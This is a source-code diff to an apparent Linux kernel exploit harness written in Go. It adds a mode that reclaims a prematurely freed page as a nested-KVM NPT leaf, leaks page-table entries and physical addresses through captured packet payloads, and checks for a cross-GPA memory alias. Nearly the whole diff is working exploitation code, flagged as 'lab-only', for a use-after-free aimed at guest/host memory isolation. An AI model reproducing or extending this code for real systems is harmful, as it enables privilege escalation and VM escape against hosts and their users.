@@ -118,6 +118,8 @@ type cfg struct {
 	staleSinglePTE         bool
 	staleSinglePTECount    int
 	staleSinglePTETakeover bool
+	staleSingleKVMNPT      bool
+	staleSingleKVMNPTCount int
 	staleSingleHold        time.Duration
 	staleNaturalAnon       bool
 	staleAnonSize          int
@@ -194,7 +196,9 @@ func parseCfg() cfg {
 	flag.BoolVar(&c.staleSinglePTE, "stale-single-ref-pte", false, "lab-only: reclaim the cleanly freed order-3 target as a process PTE page")
 	flag.IntVar(&c.staleSinglePTECount, "stale-single-ref-pte-count", 8192, "lab-only: sparse 2 MiB regions faulted to allocate distinct PTE pages")
 	flag.BoolVar(&c.staleSinglePTETakeover, "stale-single-ref-pte-takeover", false, "lab-only: reclaim the prematurely freed live PTE page with controlled packet-ring entries")
-	staleSingleHoldMs := flag.Int("stale-single-ref-hold-ms", 0, "lab-only: keep the process alive after a PTE result so the disposable VM can be shut down before mm teardown")
+	flag.BoolVar(&c.staleSingleKVMNPT, "stale-single-ref-kvm-npt", false, "lab-only: reclaim the order-0 target as a nested-KVM NPT leaf and test cross-GPA aliasing")
+	flag.IntVar(&c.staleSingleKVMNPTCount, "stale-single-ref-kvm-npt-count", 1536, "lab-only: 2 MiB-spaced nested guest pages divided across warmup, first reclaim, and alias-reclaim phases")
+	staleSingleHoldMs := flag.Int("stale-single-ref-hold-ms", 0, "lab-only: keep the process alive after a PTE/NPT result so the disposable VM can be shut down before teardown")
 	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
 	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
 	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
@@ -340,8 +344,18 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
 		os.Exit(1)
 	}
-	if (c.staleSingleAnon && c.staleSingleRing) || (c.staleSingleAnon && c.staleSinglePTE) || (c.staleSingleRing && c.staleSinglePTE) {
-		fmt.Fprintln(os.Stderr, "the single-reference anonymous, packet-ring, and PTE modes are separate order-0 reclaim experiments")
+	if c.staleSingleKVMNPT && (!c.staleLocalSingleRef || c.staleSinglePCPPrime == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-kvm-npt requires -stale-local-single-ref and a nonzero -stale-single-ref-pcp-prime")
+		os.Exit(1)
+	}
+	singleReclaimModes := 0
+	for _, enabled := range []bool{c.staleSingleAnon, c.staleSingleRing, c.staleSinglePTE, c.staleSingleKVMNPT} {
+		if enabled {
+			singleReclaimModes++
+		}
+	}
+	if singleReclaimModes > 1 {
+		fmt.Fprintln(os.Stderr, "the single-reference anonymous, packet-ring, PTE, and KVM-NPT modes are separate order-0 reclaim experiments")
 		os.Exit(1)
 	}
 	if c.staleSingleRingSize < 8<<20 || c.staleSingleRingSize > 256<<20 || c.staleSingleRingSize%4096 != 0 {
@@ -352,6 +366,10 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-count must be 1024..16384")
 		os.Exit(1)
 	}
+	if c.staleSingleKVMNPTCount < 384 || c.staleSingleKVMNPTCount > 1800 {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-kvm-npt-count must be 384..1800")
+		os.Exit(1)
+	}
 	if c.staleSinglePTETakeover && !c.staleSinglePTE {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-pte-takeover requires -stale-single-ref-pte")
 		os.Exit(1)
@@ -360,8 +378,8 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms must be 0..300000")
 		os.Exit(1)
 	}
-	if c.staleSingleHold != 0 && !c.staleSinglePTE {
-		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms requires -stale-single-ref-pte")
+	if c.staleSingleHold != 0 && !c.staleSinglePTE && !c.staleSingleKVMNPT {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-hold-ms requires -stale-single-ref-pte or -stale-single-ref-kvm-npt")
 		os.Exit(1)
 	}
 	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
@@ -971,6 +989,16 @@ func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) 
 		}
 		return errors.New("stale-options: single-ref local datagram was not queued")
 	}
+	var nptProbe *kvmNPTProbe
+	if c.staleSingleKVMNPT {
+		nptProbe, err = prepareKVMNPTProbe(c.staleSingleKVMNPTCount)
+		if err != nil {
+			syscall.Close(localRawFD)
+			return fmt.Errorf("stale-options: prepare nested-KVM NPT reclaim: %w", err)
+		}
+		fmt.Printf("stale-options: kvm-npt prepared_pages=%d warm_pages=%d first_reclaim_pages=%d alias_reclaim_pages=%d\n",
+			nptProbe.count, nptProbe.warmEnd, nptProbe.firstEnd-nptProbe.warmEnd, nptProbe.count-nptProbe.firstEnd)
+	}
 
 	rollover, err := stalePageGroomFrame(0x6d, 0, 0, 0, 0, 0, 0, 0, 0, "")
 	if err != nil {
@@ -1014,6 +1042,9 @@ func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) 
 	}
 	if c.staleSinglePTE {
 		return reclaimSingleRefAsPTE(tap, cap, c, anchorID, localID, queued, pcpQueued)
+	}
+	if c.staleSingleKVMNPT {
+		return reclaimSingleRefAsKVMNPT(tap, cap, c, anchorID, localID, queued, pcpQueued, nptProbe)
 	}
 
 	reclaimID := localID + 1
@@ -1377,6 +1408,93 @@ func reclaimSingleRefAsPTE(tap *os.File, cap *capture, c cfg, anchorID, localID 
 		time.Sleep(c.staleSingleHold)
 	}
 	runtime.KeepAlive(mapping)
+	return nil
+}
+
+func reclaimSingleRefAsKVMNPT(tap *os.File, cap *capture, c cfg, anchorID, localID uint16,
+	queued, pcpQueued int, probe *kvmNPTProbe) error {
+	defer runtime.KeepAlive(probe)
+	if c.staleSingleHold != 0 {
+		defer func() {
+			fmt.Printf("stale-options: holding live KVM-NPT state for %s; shut down the disposable VM before teardown\n", c.staleSingleHold)
+			time.Sleep(c.staleSingleHold)
+		}()
+	}
+	if probe == nil {
+		return errors.New("stale-options: nested-KVM NPT probe was not prepared")
+	}
+	if err := probe.touch(probe.warmEnd, probe.firstEnd-probe.warmEnd); err != nil {
+		return fmt.Errorf("stale-options: fault first nested NPT reclaim phase: %w", err)
+	}
+
+	staleAnchor := -1
+	matchedSparsePage := -1
+	matchedEntrySlot := -1
+	matchedEntry := uint64(0)
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete KVM-NPT anchor %d head: %w", i, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete KVM-NPT anchor %d tail: %w", i, err)
+		}
+		pkts := cap.collect(c.capture, anchorID+uint16(i))
+		window, ok := ipv4PayloadWindow(pkts, 16, 32)
+		if !ok {
+			fmt.Printf("stale-options: kvm-npt anchor=%d window=missing\n", i)
+			continue
+		}
+		matched := false
+		for slot := 0; slot < len(window)/8; slot++ {
+			entry := binary.LittleEndian.Uint64(window[slot*8 : slot*8+8])
+			physical := entry & x86PTEAddressMask
+			if sparsePage, found := probe.expected[physical]; found && entry&1 != 0 {
+				staleAnchor = i
+				matchedSparsePage = sparsePage
+				matchedEntrySlot = slot
+				matchedEntry = entry
+				matched = true
+				break
+			}
+		}
+		fmt.Printf("stale-options: kvm-npt anchor=%d window=%s matched=%t entry_slot=%d sparse_page=%d entry=%#x\n",
+			i, hex.EncodeToString(window), matched, matchedEntrySlot, matchedSparsePage, matchedEntry)
+		if matched {
+			break
+		}
+	}
+	if staleAnchor < 0 {
+		return errors.New("stale-options: order-0 target was not observed as a nested-KVM NPT leaf page")
+	}
+
+	if err := probe.touch(probe.firstEnd, probe.count-probe.firstEnd); err != nil {
+		return fmt.Errorf("stale-options: fault nested NPT alias-reclaim phase: %w", err)
+	}
+	changedBefore := probe.changedMarkerPages()
+	originalGPA := uint32(kvmSparseGPA + matchedSparsePage*pmdSpan)
+	if err := probe.writeGPA(originalGPA, kvmAliasMarker); err != nil {
+		return fmt.Errorf("stale-options: write through potentially aliased nested GPA %#x: %w", originalGPA, err)
+	}
+	changedAfter := probe.changedMarkerPages()
+	aliasPage := -1
+	matchedAlias := len(changedBefore) == 0 && len(changedAfter) == 1 && changedAfter[0] != matchedSparsePage
+	if len(changedAfter) == 1 {
+		aliasPage = changedAfter[0]
+	}
+	aliasGPA := uint64(0)
+	if aliasPage >= 0 {
+		aliasGPA = uint64(kvmSparseGPA + aliasPage*pmdSpan)
+	}
+	windowPhysical := matchedEntry & x86PTEAddressMask
+	fmt.Printf("stale-options: single-ref-kvm-npt queued_bytes=%d pcp_first_datagram=%d pcp_prime=%d pcp_wait=%s npt_pages=%d anchors=%d local_id=%#x stale_anchor=%d entry_slot=%d disclosed_entry=%#x disclosed_physical=%#x original_sparse_page=%d original_gpa=%#x changed_before=%v changed_after=%v alias_page=%d alias_gpa=%#x matched=%t\n",
+		queued, pcpQueued, c.staleSinglePCPPrime, c.staleSinglePCPWait,
+		probe.count, c.staleSingleAnchors, localID, staleAnchor, matchedEntrySlot,
+		matchedEntry, windowPhysical, matchedSparsePage, originalGPA,
+		changedBefore, changedAfter, aliasPage, aliasGPA, matchedAlias)
+	if !matchedAlias {
+		return errors.New("stale-options: reclaimed nested-KVM page did not create a cross-GPA alias")
+	}
 	return nil
 }
 
